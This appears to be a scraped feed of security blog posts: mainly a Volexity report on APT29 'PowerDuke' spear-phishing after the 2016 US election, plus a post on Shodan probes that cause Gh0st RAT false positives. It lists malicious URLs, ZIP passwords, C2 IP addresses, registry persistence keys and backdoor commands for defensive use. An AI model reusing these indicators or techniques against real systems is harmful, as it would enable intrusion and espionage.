<p>Trend Micro will continue collaborating with agencies like INTERPOL to thwart cybercrime. To know all about the current state and possible future developments in cybercrime in West Africa, read <em><a href=""http://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/west-african-underground"">Cybercrime in West Africa: Poised for an Underground Market</a></em>. For a snapshot of the West African threat landscape, see <em><a href=""https://documents.trendmicro.com/images/TEx/infographics/cybercrime-west-africa.jpg"">Are We Bound to See a West African Underground Market?</a></em></p>
<p>Post from: <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/"">Trendlabs Security Intelligence Blog - by Trend Micro</a></p>
<p><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/west-africa-poised-underground-market/"" rel=""nofollow"">Is West Africa Poised for an Underground Market?</a></p>
<div class=""feedflare"">
<a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=Zc6V-c39SSo:stomXQ_kWwE:yIl2AUoC8zA""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=Zc6V-c39SSo:stomXQ_kWwE:F7zBnMyn0Lo""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=Zc6V-c39SSo:stomXQ_kWwE:F7zBnMyn0Lo"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=Zc6V-c39SSo:stomXQ_kWwE:qj6IDK7rITs""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=Zc6V-c39SSo:stomXQ_kWwE:V_sGLiPBpWU""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=Zc6V-c39SSo:stomXQ_kWwE:V_sGLiPBpWU"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=Zc6V-c39SSo:stomXQ_kWwE:l6gmwiTKsz0""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=Zc6V-c39SSo:stomXQ_kWwE:gIN9vFwOqvQ""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=Zc6V-c39SSo:stomXQ_kWwE:gIN9vFwOqvQ"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=Zc6V-c39SSo:stomXQ_kWwE:TzevzKxY174""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174"" /></a>
</div><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/Zc6V-c39SSo"" width=""1"" />",http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/Zc6V-c39SSo/
Have you been haunted by the Gh0st RAT today?,"<p>If you run certain network monitoring and security appliances, you may have had a few small heart attacks today. Organizations all around the world are receiving alerts that they may have a system that is infected with the Gh0st remote access trojan (RAT). Making things worse is that it will likely appear that it is a server that is infected. The good news is there is a very strong chance the alerting is a <span style=""text-decoration: underline;"">false positive</span>. There is likely nothing malicious going on and all your need to do is tune your signatures.</p>
<p>It turns out that <a href=""https://www.shodan.io/"">Shodan</a> is doing scans across the Internet in what appears to be an attempt to identify Gh0st RAT command and control (C2) servers. If you are not familiar with Gh0st, it&#8217;s a full featured RAT that sends a packet flag that is typically shared by the command and control server. The default packet flag, of which there are many variations, is none other than <strong>Gh0st</strong>. It may not actually be necessary to send the correct string to get a Gh0st C2 server to respond, but it can&#8217;t hurt the effort. In the cases that Volexity has observed thus far, Shodan is sending the following:</p>
<blockquote><p>0000000: 4768 3073 74ad 0000 00e0 0000 00<span style=""color: #0000ff;"">78 9c</span>4b  Gh0st&#8230;&#8230;..x.K<br />
0000010: 5360 6098 c3c0 c0c0 06c4 8c40 bc51 9681  S&#8220;&#8230;&#8230;..@.Q..<br />
0000020: 8109 4807 a716 9565 26a7 2a04 2426 672b  ..H&#8230;.e&amp;.*.$&amp;g+<br />
0000030: 1832 94f6 b030 30ac a872 6300 0111 a082  .2&#8230;00..rc&#8230;..<br />
0000040: 1f5c 6026 83c7 4b37 8619 e56e 0c39 956e  .\`&amp;..K7&#8230;n.9.n<br />
0000050: 0c3b 840f 33ac e873 6368 a85e cf34 274a  .;..3..sch.^.4&#8217;J<br />
0000060: 97a9 82e3 30c3 9168 5d26 90f8 ce97 53cb  &#8230;.0..h]&amp;&#8230;.S.<br />
0000070: 4134 4c3f 323d e1c4 9286 0b40 f560 0c54  A4L?2=&#8230;..@.`.T<br />
0000080: 1fae af5d 0a72 0b03 23a3 dc02 7e06 8603  &#8230;].r..#&#8230;~&#8230;<br />
0000090: 2b18 6dc2 3dfd 7443 2c43 fd4c 3c3c 3d3d  +.m.=.tC,C.L&lt;&lt;==<br />
00000a0: 5c9d 1988 00e5 2002 0054 f52b 5c         \&#8230;.. ..T.+\</p></blockquote>
<p>Not too far into the traffic is a <span style=""color: #0000ff;"">zlib header</span>. You can easily decode this traffic from a packet capture file with a framework like <a href=""https://github.com/MITRECND/chopshop/"">ChopShop</a>. The Shodan traffic decodes to the following:</p>
<blockquote><p>TOKEN: LOGIN: WIN-T9UN4HIIHEC: Windows 7 Service Pack 1 &#8211; Build: 7601 &#8211; Clock: 4000 Mhz &#8211; IP: 192.168.1.60 Webcam: yes</p></blockquote>
<p>The Shodan scans are sending traffic that would be consistent with an infected Windows 7 system named WIN-T9UN4HIIHEC.</p>
<p>What this boils down to is that your alerts for a Gh0st RAT infection are likely false positives and the result of inbound scanning. Shodan is an excellent resource of information and constantly does scans to catalog different parts of the Internet. You can easily verify this by looking at the direction of the traffic, observing if the source of the traffic is from Shodan, or by looking at the payload and comparing it with the above. You can tune any alerting you might have to make sure this traffic is alerting based on traffic <strong>outbound</strong> from and not inbound to your network.</p>",https://www.volexity.com/blog/2017/03/23/have-you-been-haunted-by-the-gh0st-rat-today/
PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs,"<p>In the wake of the 2016 United States Presidential Election, not even six hours after Donald Trump became the nation&#8217;s President-Elect, an advanced persistent threat (APT) group launched a series of coordinated and well-planned spear phishing campaigns. Volexity observed five different attack waves with a heavy focus on U.S.-based think tanks and non-governmental organizations (NGOs). These e-mails came from a mix of attacker created Google Gmail accounts and what appears to be compromised e-mail accounts at Harvard&#8217;s Faculty of Arts and Sciences (FAS). These e-mails were sent in large quantities to different individuals across many organizations and individuals focusing in <strong>national security</strong>, <strong>defense</strong>, <strong>international affairs</strong>, <strong>public policy</strong>, and <strong>European and Asian studies</strong>. Two of the attacks purported to be messages forwarded on from the <strong>Clinton Foundation</strong> giving  insight and perhaps a postmortem analysis into the elections. Two of the other attacks purported to be eFax links or documents pertaining to the election&#8217;s outcome being revised or rigged. The last attack claimed to be a link to a PDF download on &#8220;<em>Why American Elections Are Flawed.</em>&#8221; Volexity believes a group it refers to as <span style=""text-decoration: underline;""><strong>The Dukes</strong></span> (also known as APT29 or Cozy Bear) is responsible for post-election attack activity.</p>
<h2>Background</h2>
<p>Since August of this year, Volexity has been actively involved in investigating and tracking several attack campaigns from the Dukes. Most notably the Dukes have previously been tied to the <a href=""https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/"">breach</a> of the Democratic National Committee (DNC) and <a href=""https://securelist.com/blog/research/69731/the-cozyduke-apt/"">intrusions</a> into multiple high-profile United States Government organizations. In July 2015, the Dukes started heavily targeting  think tanks and NGOs. This represented a fairly significant shift in the group&#8217;s previous operations and one that continued in the lead up to and immediately after the 2016 United States Presidential election.</p>
<p>On August 10, 2016 and August 25, 2016, the Dukes launched several waves of highly targeted spear phishing attacks against several U.S.-based think tanks and NGOs. These spear phishing messages were spoofed and made to appear to have been sent from real individuals at well-known think tanks in the United States and Europe. These August waves of attacks purported to be from individuals at <a href=""https://www.transparency.org"">Transparency International</a>, the <a href=""https://www.cnas.org"">Center for a New American Security (CNAS)</a>,  the <a href=""https://www.iiss.org"">International Institute for Strategic Studies (IISS)</a>, <a href=""http://www.eurasiagroup.net"">Eurasia Group</a>, and the <a href=""http://www.cfr.org"">Council on Foreign Relations (CFR)</a>.</p>
<p>The Dukes are known for launching their attacks by sending links to ZIP files, that contain malicious executables, hosted on legitimate compromised web servers. However, each of the e-mail messages from the August attacks contained a Microsoft Office Word (.doc) or Excel (.xls) attachment. These attachments, when viewed, contained legitimate report content from each of the organizations they appeared to have been sent from. However, the attackers inserted macros into the documents designed to install a malware downloader on the system. Successful exploitation would result in the download of a PNG image file from a compromised webserver. These attack campaigns leveraged steganography in the PNG files by hiding components of a backdoor that would exist only in memory after being loaded into rundll32.exe. Volexity has dubbed this backdoor <strong>PowerDuke</strong>. Similar attack campaigns using documents with macros dropping PowerDuke were further observed through October, where Universities, and not think tanks appear to have been the primary targets. Details of these attacks have been provided to Volexity customers. Concerned NGO&#8217;s and Universities that may have been targeted by these attacks campaigns are welcome to reach out for additional details.</p>
<h2>November 9 &#8211; Post-Election Spear Phishing Waves</h2>
<p>The post-election attacks launched by the Dukes on November 9 were very similar to previous attacks seen from the Dukes in both 2015 and 2016. The PowerDuke malware, first seen in August 2016, was once again used in these most recent attacks. Three of the five attack waves contained links to download files from domains that the attackers appear to have control over. The other two attacks contained documents with malicious macros embedded within them. Each of these different attack waves were slightly different from one another and are detailed below.</p>
<h3>Attack Wave 1: eFax &#8211; The &#8220;Shocking&#8221; Truth About Election Rigging</h3>
<p>The first attack wave is similar to much older attacks from the Dukes that purport to be an electronic Fax. This message claims to have been sent from Secure Fax Corp. and has a link to a ZIP file that contains a Microsoft shortcut file (.LNK). This shortcut file contains PowerShell commands that conduct anti-VM checks, drop a backdoor, and launch a clean decoy document. The e-mail message was sent from the attacker controlled e-mail account <span style=""color: #ff0000;""><strong>industry.faxsolution@gmail.com</strong></span>. The screen shot below shows the e-mail that was sent.</p>
<p><a href=""https://www.volexity.com/blog/wp-content/uploads/2016/11/cozy-efax-link.png""><img alt=""cozy-efax-link"" class=""aligncenter size-full wp-image-275"" height=""673"" src=""https://www.volexity.com/blog/wp-content/uploads/2016/11/cozy-efax-link.png"" width=""877"" /></a></p>
<p>The e-mail contained links pointing to the following URL:</p>
<p style=""padding-left: 30px;""><span style=""color: #ff0000;"">hxxp://efax.pfdweek[.]com/eFax/message0236.ZIP</span></p>
<p>Inside of this password (1854) protected ZIP file is a Microsoft shortcut file named:</p>
<p style=""padding-left: 30px;""><strong>37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk</strong></p>
<p>Note that <span style=""color: #ff0000;""><strong>pfdweek[.]com</strong></span> appears to be under the control of the attackers but may be a hijacked domain.</p>
<p>Details on each of the files are included below.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> message0236.ZIP<br />
<strong>File size:</strong> 643843 bytes<br />
<strong>MD5 hash:</strong> bea0a6f069bd547db685698bc9f9d25a<br />
<strong>SHA1 hash:</strong> ee09bec09388338134d47fa993d5e0f86efe5bd4<br />
<strong>Notes: </strong>Password protected ZIP file containing malicious Microsoft shortcut file (37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk)</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk<br />
<strong>File size:</strong> 724003 bytes<br />
<strong>MD5 hash:</strong> c272aebc661c54cc960ba9a4a3578952<br />
<strong>SHA1 hash:</strong> 52d62213c66a603e33dab326bf4fa29d6ac681c4<br />
<strong>Notes: </strong>Microsoft shortcut file with embedded PowerShell, PowerDuke backdoor (hqwhbr.lck), and clean decoy document.</p>
<p style=""padding-left: 30px;""><strong>Filename: </strong>kxwn.lock<br />
<strong>File size:</strong>  10752 bytes<br />
<strong>MD5 hash: </strong>28b95a2c399e60ee535c32e73860fbea<br />
<strong>SHA1 hash:</strong> bf4ce67b6e745e26fcf3a2d41938a9dff1395076<br />
<strong>Notes: </strong>Primary PowerDuke backdoor (DLL) loader (leverages kxwn.lock:schemas) dropped to &#8220;%APPDATA\Roaming\Microsoft\&#8221; with persistence via HKCU Run Key &#8220;WebCache&#8221; (rundll32.exe %APPDATA\Roaming\Microsoft\kxwn.lock , #2). Connects directly to <span style=""color: #ff0000;""><strong>173.243.80.6:443</strong></span> for command and control.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> kxwn.lock:schemas<br />
<strong>File size:</strong>  609853 bytes<br />
<strong>MD5 hash: </strong>4e1dec16d58ba5f4196f6a76a0bca75c<br />
<strong>SHA1 hash:</strong> a7c43d7895ecef2b6306fb00972c321060753361<br />
<strong>Notes: </strong>Alternate data stream (ADS) PNG  file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA).</p>
<h3>Attack Wave 2: eFax &#8211; Elections Outcome Could Be revised [Facts of Elections Fraud]</h3>
<p>The second attack wave that Volexity observed leveraged a Microsoft Word document with a malicious embedded macro. This appears to be consistent with several previous Dukes attack campaigns, such as those on August 25, 2016. The Macros contain several anti-VM checks designed to avoid executing in virtualized environments. The e-mail message was sent from the attacker controlled e-mail account <span style=""color: #ff0000;""><strong>securefaxsolution@gmail.com</strong></span>.</p>
<p>The screen shot below shows the e-mail that was sent.</p>
<p><a href=""https://www.volexity.com/blog/wp-content/uploads/2016/11/cozy-efax-doc.png""><img alt=""cozy-efax-doc"" class=""aligncenter size-full wp-image-276"" height=""673"" src=""https://www.volexity.com/blog/wp-content/uploads/2016/11/cozy-efax-doc.png"" width=""877"" /></a>Details on the malware components of this attack wave are included below.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> election-headlines-FTE2016.docm<br />
<strong>File size:</strong> 835072 bytes<br />
<strong>MD5 hash:</strong> a8e700492e113f73558131d94bc9ae2f<br />
<strong>SHA1 hash:</strong> b5684384c8028f0324ed7119f6abf379f2789970<br />
<strong>Notes: </strong>Document containing malicious macro that drops</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> fywhx.dll<br />
<strong>File size:</strong> 10752 bytes<br />
<strong>MD5 hash:</strong> ad6723f61e10aefd9688b29b474a9323<br />
<strong>SHA1 hash:</strong> dd766876b3be5022bfb062f454f878abfbc670b8<br />
<strong>Notes: </strong>PowerDuke backdoor file dropped to &#8220;%APPDATA\Roaming\HP\&#8221; with persistence via HKCU Run Key &#8220;ToolboxFX&#8221; (rundll32.exe %APPDATA\Roaming\HP\fywhx.dll #2). Connects directly to <span style=""color: #ff0000;""><strong>185.132.124.43:443</strong></span> for command and control.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> fywhx.dll:schemas<br />
<strong>File size:</strong>  608854 bytes<br />
<strong>MD5 hash: </strong>8c53ee9137a7d540fcff0d523f7d0822<br />
<strong>SHA1 hash:</strong> ab32c09c46e0c9dbc576fefee68e5a2f57e0482e<br />
<strong>Notes: </strong>Alternate data stream (ADS) PNG  file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA).</p>
<h3>Attack Wave 3: Why American Elections Are Flawed</h3>
<p>Volexity believes the following e-mail received the widest distribution among the targeted organizations. The e-mail purports to have been sent from Harvard&#8217;s &#8220;PDF Mobile Service&#8221; or &#8220;PFD Mobile Service&#8221;. The spelling of this non-existent service is inconsistent in the e-mail.  The latter spelling appears to be a typographical error that is consistent with the domain names registered by the attackers. The screen shot below shows the e-mail that was sent.</p>
<p><a href=""https://www.volexity.com/blog/wp-content/uploads/2016/11/coz-link1-1.png""><img alt=""coz-link1"" class=""aligncenter size-full wp-image-251"" height=""673"" src=""https://www.volexity.com/blog/wp-content/uploads/2016/11/coz-link1-1.png"" width=""877"" /></a>The e-mail contained links pointing to the following URL:</p>
<p style=""padding-left: 30px;""><span style=""color: #ff0000;"">hxxp://efax.pfdresearch[.]org/eFax/RWP_16-038_Norris.ZIP</span></p>
<p>Inside of this password (8734) protected ZIP file is an executable named:</p>
<p style=""padding-left: 30px;""><strong>RWP16-038_Norris.exe</strong></p>
<p>Note that <span style=""color: #ff0000;""><strong>pfdresearch[.]org</strong></span> appears to be under the control of the attackers but may be a hijacked domain.</p>
<p>Details on the malware components of this attack wave are included below.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> RWP_16-038_Norris.ZIP<br />
<strong>File size:</strong> 854996 bytes<br />
<strong>MD5 hash:</strong> 8b3050a95e3ce00424b85f6e9cc3ccec<br />
<strong>SHA1 hash:</strong> d5dcf445830c54af145c0dfeaebf28f8ec780eb5<br />
<strong>Notes: </strong>Password protected ZIP file with malicious executable inside (RWP16-038_Norris.exe).</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> RWP16-038_Norris.exe<br />
<strong>File size:</strong> 1144832 bytes<br />
<strong>MD5 hash:</strong> 3335f0461e5472803f4b19b706eaf4b5<br />
<strong>SHA1 hash:</strong> 5cc807f80f14bc4a1d6036865e50d576200dfd2e<br />
<strong>Notes: </strong>Dropper for PowerDuke backdoor and clean decoy document</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> gwV46iIc.idx<br />
<strong>File size:</strong>  10752 bytes<br />
<strong>MD5 hash: </strong>ae997d2047705ff46a0c228f7b5d7052<br />
<strong>SHA1 hash:</strong> 1067ddd5615518e0cbac7389a024b32f119a3229<br />
<strong>Notes: </strong>Primary PowerDuke backdoor (DLL) loader (leverages gwV46iIc.idx:schemas) dropped to &#8220;%APPDATA\Roaming\Apple\&#8221; with persistence via HKCU Run Key &#8220;ConnectionCenter&#8221; (rundll32.exe %APPDATA\Roaming\Apple\gwV46iIc.idx, #2). Connects directly to <span style=""color: #ff0000;""><strong>185.124.86.121:443</strong></span> for command and control.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> gwV46iIc.idx:schemas<br />
<strong>File size:</strong>  580968 bytes<br />
<strong>MD5 hash: </strong>7b9b51cb44cd6a7af1cd28faeeda04a7<br />
<strong>SHA1 hash:</strong> e3bd7bdfe0026cf4ee39fd75a771eac52ffea095<br />
<strong>Notes: </strong>Alternate data stream (ADS) PNG  file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA).</p>
<h3>Attack Wave 4: Clinton Foundation FYI #1</h3>
<p>The fourth attack wave that Volexity observed leveraged a Microsoft Word document with a malicious embedded macro. This appears to be consistent with several previous Dukes attack campaigns, such as those on August 25, 2016. The Macros contain several anti-VM checks designed to avoid executing in virtualized environments. The screen shot below shows the e-mail that was sent.</p>
<p><a href=""https://www.volexity.com/blog/wp-content/uploads/2016/11/cozy-doc-1.png""><img alt=""cozy-doc"" class=""aligncenter size-full wp-image-255"" height=""670"" src=""https://www.volexity.com/blog/wp-content/uploads/2016/11/cozy-doc-1.png"" width=""887"" /></a></p>
<p><a href=""https://www.volexity.com/blog/wp-content/uploads/2016/11/coz-doc-bottom-1.png""><img alt=""coz-doc-bottom"" class=""aligncenter size-full wp-image-254"" height=""670"" src=""https://www.volexity.com/blog/wp-content/uploads/2016/11/coz-doc-bottom-1.png"" width=""887"" /></a></p>
<p>Details on the malware components of this attack wave are included below.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> harvard-iop-fall-2016-poll.doc<br />
<strong>File size:</strong> 2808832 bytes<br />
<strong>MD5 hash:</strong> ead48f15ebc088384a4bd6190c2343fa<br />
<strong>SHA1 hash:</strong> 0b9dccfcb2cc8bced343b9d930e475f1d0e5d966<br />
<strong>Notes: </strong>Document containing malicious macro that drops impku.dat and impku.dat:shemas.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong>  impku.dat<br />
<strong>File size:</strong> 10752 bytes<br />
<strong>MD5 hash:</strong> 9f420779c90e118a0b5fd904380878a1<br />
<strong>SHA1 hash:</strong> 11523d859e9a818c2628d7954502cbdb5eeb2199<br />
<strong>Notes: </strong>PowerDuke backdoor file dropped to &#8220;%APPDATA\Roaming\Dell\&#8221; with persistence via HKCU Run Key &#8220;Communicator&#8221; (rundll32.exe %APPDATA\Roaming\Dell\impku.idat, #2). Connects directly to <span style=""color: #ff0000;""><strong>185.26.144.109:443</strong></span> for command and control.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> impku.dat:schemas<br />
<strong>File size:</strong>  608854 bytes<br />
<strong>MD5 hash: </strong>b774f39d31c32da0f6a5fb5d0e6d2892<br />
<strong>SHA1 hash:</strong> ae3ff39c2a7266132e0af016a48b97d565463d90<br />
<strong>Notes: </strong>Alternate data stream (ADS) PNG  file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA).</p>
<h3>Attack Wave 5: Clinton Foundation FYI #2</h3>
<p>The fifth attack wave that Volexity observed once against leveraged a download link and a new domain that appears to be under control of the attackers. The link in the e-mail points to a ZIP file that has a Microsoft shortcut file (.LNK) inside of it. This shortcut file contains PowerShell commands that conduct anti-VM checks, drop a backdoor, and launch a clean decoy document. Like Attack Wave #3, this e-mail message also purported to be forwarded from Laura Graham at the Clinton Foundation. The message body contained dozens of e-mail addresses to which the message originally claims to have been sent, with organizations similar to Attack Wave #3. The e-mail message from this attack wave, with identifying information removed, is shown below.</p>
<p><a href=""https://www.volexity.com/blog/wp-content/uploads/2016/11/cozy-link2.png""><img alt=""cozy-link2"" class=""aligncenter size-full wp-image-256"" height=""663"" src=""https://www.volexity.com/blog/wp-content/uploads/2016/11/cozy-link2.png"" width=""877"" /></a><a href=""https://www.volexity.com/blog/wp-content/uploads/2016/11/cozy-link2-bottom.png""><img alt=""cozy-link2-bottom"" class=""aligncenter size-full wp-image-257"" height=""663"" src=""https://www.volexity.com/blog/wp-content/uploads/2016/11/cozy-link2-bottom.png"" width=""877"" /></a></p>
<p>As seen in the screen shot above, the e-mail contained links pointing to the following URL:</p>
<p style=""padding-left: 30px;""><span style=""color: #ff0000;"">hxxp://efax.pfdregistry[.]net/eFax/37486.ZIP</span></p>
<p>Inside of this password (6190) protected ZIP file a Microsoft Shortcut file named:</p>
<p style=""padding-left: 30px;""><strong> 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk</strong></p>
<p>Note that <span style=""color: #ff0000;""><strong>pfdregistry[.]net </strong></span>appears to be under the control of the attackers but may be a hijacked domain.</p>
<p>Details on the malware components of this attack wave are included below.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> 37486.ZIP<br />
<strong>File size:</strong> 580688 bytes<br />
<strong>MD5 hash:</strong> f79caf27a99c091e6c1775b306993341<br />
<strong>SHA1 hash:</strong> a76c02c067eae26d78f4b494274dfa6aedc6fa7a<br />
<strong>Notes: </strong>Password protected ZIP file containing malicious Microsoft shortcut file 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk<br />
<strong>File size:</strong> 661782 bytes<br />
<strong>MD5 hash:</strong> f713d5df826c6051e65f995e57d6817d<br />
<strong>SHA1 hash:</strong> 68ce4c0324f03976247ff48803a7d988f9f9f43f<br />
<strong>Notes: </strong>Microsoft shortcut file with embedded PowerShell, PowerDuke backdoor (hqwhbr.lck), and clean decoy document.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> hqwhbr.lck<br />
<strong>File size:</strong> 10752 bytes<br />
<strong>MD5 hash:</strong> 57c627d68e156676d08bfc0829b94331<br />
<strong>SHA1 hash:</strong> 4bcbf078a78ba0e842f78963ba9dd71240ab6a6d<br />
<strong>Notes: </strong>PowerDuke backdoor file dropped to &#8220;%APPDATA\Roaming\Skype\&#8221; with persistence via HKCU Run Key &#8220;IAStorIcon&#8221; (rundll32.exe %APPDATA\Roaming\Apple\hqwhbr.lck, #2).  Connects directly to <span style=""color: #ff0000;""><strong>177.10.96.30:443</strong></span> for command and control.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> hqwhbr.lck:schemas<br />
<strong>File size:</strong> 547636 bytes<br />
<strong>MD5 hash: </strong>cbf96820dc74a50a91b2b8b94376682a<br />
<strong>SHA1 hash:</strong> 5f105801a1abb398dadc756480713f9bd7a4aa73<br />
<strong>Notes: </strong>Alternate data stream (ADS) PNG  file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA).</p>
<h3>The PowerDuke Backdoor</h3>
<p>The PowerDuke backdoor boasts a pretty extensive list of features that allow the Dukes to examine and control a system. Volexity suspects the feature set that has been built into PowerDuke is an extension of their anti-VM capabilities in the initial dropper files. Several commands supported by PowerDuke facilitate getting information about the system.</p>
<p>A previous analysis of PowerDuke showed it supported the following commands.</p>
<table style=""height: 192px;"" width=""737"">
<tbody>
<tr>
<td width=""107"">comp</td>
<td width=""563"">get the NetBIOS name via GetComputerNameEx</td>
</tr>
<tr>
<td width=""107"">domain</td>
<td width=""563"">get the computer&#8217;s domain via NetWkstaGetInfo</td>
</tr>
<tr>
<td width=""107"">drives</td>
<td width=""563"">get logical drives, drive type, free space, serial number, etc.</td>
</tr>
<tr>
<td width=""107"">fsize</td>
<td width=""563"">get the size of a file via GetFileAttributesExW or failing that, by mapping the file and getting the size</td>
</tr>
<tr>
<td width=""107"">kill</td>
<td width=""563"">stop a process via TerminateProcess</td>
</tr>
<tr>
<td width=""107"">memstat</td>
<td width=""563"">get memory usage status via GlobalMemoryStatusEx, total RAM, percent used, etc.</td>
</tr>
<tr>
<td width=""107"">osdate</td>
<td width=""563"">get the time the machine was built (via InstallDate registry key)</td>
</tr>
<tr>
<td width=""107"">osver</td>
<td width=""563"">get OS info via registry, such as ProductName, CurrentBuild, CurrentVersion, CSDBuildNumber, etc.</td>
</tr>
<tr>
<td width=""107"">pslist</td>
<td width=""563"">list processes via CreateToolhelp32Snapshot</td>
</tr>
<tr>
<td width=""107"">pwd</td>
<td width=""563"">get current directory via GetCurrentDirectoryW</td>
</tr>
<tr>
<td width=""107"">run</td>
<td width=""563"">start a process via CreateProcessW</td>
</tr>
<tr>
<td width=""107"">#</td>
<td width=""563"">runs cmd.exe /c and gets the output via Named Pipe and sends the data back</td>
</tr>
<tr>
<td width=""107"">siduser</td>
<td width=""563"">gets the current user&#8217;s SID via GetTokenInformation and LookupAccountSidW</td>
</tr>
<tr>
<td width=""107"">time</td>
<td width=""563"">the time + timezone (GetLocalTime and GetTimeZoneInformation)</td>
</tr>
<tr>
<td width=""107"">uptime</td>
<td width=""563"">number of seconds since the last boot</td>
</tr>
<tr>
<td width=""107"">user</td>
<td width=""563"">the user&#8217;s name via GetUserNameExW</td>
</tr>
<tr>
<td width=""107"">wipe</td>
<td width=""563"">writes random data across a file, then deletes the file</td>
</tr>
<tr>
<td width=""107"">wnd</td>
<td width=""563"">gets the text of the current foreground window</td>
</tr>
<tr>
<td width=""107"">fgetp</td>
<td width=""563"">download file</td>
</tr>
<tr>
<td width=""107"">fputp</td>
<td width=""563"">upload file</td>
</tr>
<tr>
<td width=""107"">power</td>
<td width=""563"">reboot or shutdown (via previously loaded PowrProf.dll)</td>
</tr>
<tr>
<td width=""107"">cdt</td>
<td width=""563"">change to temporary directory</td>
</tr>
<tr>
<td width=""107"">reqdelay</td>
<td width=""563"">sleep for specified time</td>
</tr>
</tbody>
</table>
<p>Volexity has not fully examined the PowerDuke instances from these campaigns but has noted the malware appears to support the following additional commands not described above:</p>
<ul>
<li>sidcomp</li>
<li>buzy</li>
<li>exit</li>
<li>copy</li>
<li>detectav</li>
<li>mkdir</li>
<li>software</li>
<li>shlist</li>
<li>shinfo</li>
<li>shdel</li>
<li>shadd</li>
<li>setpng</li>
<li>conn</li>
<li>setsrv</li>
</ul>
<p>Volexity may update this post following further PowerDuke analysis.</p>
<h3>Network Indicators</h3>
<p>Below are network indicators associated with download URLs for the aforementioned Dukes attack campaigns.</p>
<table>
<tbody>
<tr>
<td><strong>Hostname</strong></td>
<td><strong>IP Address</strong></td>
<td><strong>ASN Information</strong></td>
</tr>
<tr>
<td>efax.pfdresearch.org</td>
<td>81.82.196.162</td>
<td>6848 | 81.82.0.0/15 | TELENET | BE | telenet.be | Telenet Operaties N.V.</td>
</tr>
<tr>
<td>efax.pfdregistry.net</td>
<td>65.15.88.243</td>
<td>7018 | 65.15.64.0/19 | ATT-INTERNET4 | US | bellsouth.net | Bellsouth.net Inc.</td>
</tr>
<tr>
<td>efax.pfdweek.com</td>
<td>84.206.44.194</td>
<td>31581 | 84.206.0.0/16 | KOPINT | HU | ekg.kopdat.hu | National Infocommunications Service Company Limited by Shares</td>
</tr>
</tbody>
</table>
<p>Below are network indicators associated with command and control servers for the aforementioned Dukes attack campaigns.</p>
<table>
<tbody>
<tr>
<td><strong>IP Address</strong></td>
<td><strong>ASN Information</strong></td>
</tr>
<tr>
<td>185.124.86.121</td>
<td>43260 | 185.124.86.0/24 | DGN | TR | &#8211; | &#8211;</td>
</tr>
<tr>
<td>185.132.124.43</td>
<td>43260 | 185.132.124.0/24 | DGN | TR | &#8211; | &#8211;</td>
</tr>
<tr>
<td>185.26.144.109</td>
<td>60721 | 185.26.144.0/24 | BURSABIL | TR | bursabil.com.tr | Bursabil Konfeksiyon Tekstil Bilisim Teknoloji insaat Sanayi ve Ticaret Limited Sirketi</td>
</tr>
<tr>
<td>173.243.80.6</td>
<td>14979 | 173.243.80.0/24 | AERONET-WIRELESS | PR | aeronetpr.com | Aeronet Wireless</td>
</tr>
<tr>
<td>177.10.96.30</td>
<td>262848 | 177.10.96.0/21 | Naja | BR | najatel.com.br | Naja Telecomunicacoes Ltda.</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h2>Conclusion</h2>
